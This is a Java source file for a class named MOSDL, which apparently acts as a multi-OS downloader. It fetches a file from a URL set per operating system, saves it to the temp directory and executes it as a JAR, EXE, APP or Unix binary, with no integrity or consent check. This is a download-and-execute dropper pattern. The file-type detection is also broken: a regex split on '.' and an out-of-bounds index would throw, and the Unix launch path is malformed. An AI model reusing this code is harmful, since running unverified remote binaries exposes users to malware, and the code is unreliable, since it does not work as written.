package com.elementiumdev.multios;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

import com.elementiumdev.util.Constants;

public class MOSDL {
	
	private static String OS = System.getProperty("os.name").toLowerCase();

	public static void main(String[] args) {
		String os = System.getProperty("os.name");
		try {
			if(isWindows()) {
				dl(Constants.WINDOWS_URL);
			} else if(isMac()) {
				dl(Constants.OSX_URL);
			} else if(isUnix()) {
				dl(Constants.LINUX_URL);
			} else if(isSolaris()) {
				dl(Constants.SOLARIS_URL);
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	public static void dl(String link) throws IOException {
		File file = null;
		URL url = new URL(link);
        HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
        int responseCode = httpConn.getResponseCode();
 
        if (responseCode == HttpURLConnection.HTTP_OK) {
            String fileName = "";
            String disposition = httpConn.getHeaderField("Content-Disposition");
            String contentType = httpConn.getContentType();
            int contentLength = httpConn.getContentLength();
 
            if (disposition != null) {
                int index = disposition.indexOf("filename=");
                if (index > 0) {
                    fileName = disposition.substring(index + 10,
                            disposition.length() - 1);
                }
            } else {
                fileName = link.substring(link.lastIndexOf("/") + 1,
                        link.length());
            }
 
            System.out.println("Content-Type = " + contentType);
            System.out.println("Content-Disposition = " + disposition);
            System.out.println("Content-Length = " + contentLength);
            System.out.println("fileName = " + fileName);
 
            InputStream inputStream = httpConn.getInputStream();
            String saveFilePath = System.getProperty("java.io.tmpdir") + File.separator + fileName;
             
            FileOutputStream outputStream = new FileOutputStream(saveFilePath);
 
            int bytesRead = -1;
            byte[] buffer = new byte[4096];
            while ((bytesRead = inputStream.read(buffer)) != -1) {
                outputStream.write(buffer, 0, bytesRead);
            }
 
            outputStream.close();
            inputStream.close();
            
            file = new File(saveFilePath);

        }
        httpConn.disconnect();
        
        if(file != null ) {
        	run(file);
        }
    }
	
	public static void run(File file) throws IOException {
		System.out.println("Path: " + file.getAbsolutePath() + "\nType: " + fileType(file.getAbsolutePath()));
		
		String type = fileType(file.toString());
		if(type.equalsIgnoreCase("JAR")) {
			if(isWindows()) {
				Runtime.getRuntime().exec("java.exe -jar " + file.getAbsolutePath());
			} else if(isMac() || isUnix() || isSolaris()) {
				Runtime.getRuntime().exec("java -jar " + file.getAbsolutePath());
			}
		} else if(type.equalsIgnoreCase("EXE")) {
			if(isWindows()) {
				Runtime.getRuntime().exec(file.getAbsolutePath());
			}
		} else if(type.equalsIgnoreCase("APP")) {
			if(isMac()) {
				Runtime.getRuntime().exec(file.getAbsolutePath());
			}
		} else {
			if(isUnix()) {
				Runtime.getRuntime().exec("." + file.getAbsolutePath());
			}
		}
	}
	
	public static String fileType(String file) {
		String type = file.split("\\.")[file.split(".").length+1].toUpperCase();
		return type;
	}
	
	public static boolean isWindows() {

		return (OS.indexOf("win") >= 0);

	}

	public static boolean isMac() {

		return (OS.indexOf("mac") >= 0);

	}

	public static boolean isUnix() {

		return (OS.indexOf("nix") >= 0 || OS.indexOf("nux") >= 0 || OS.indexOf("aix") > 0 );
		
	}

	public static boolean isSolaris() {

		return (OS.indexOf("sunos") >= 0);

	}
}
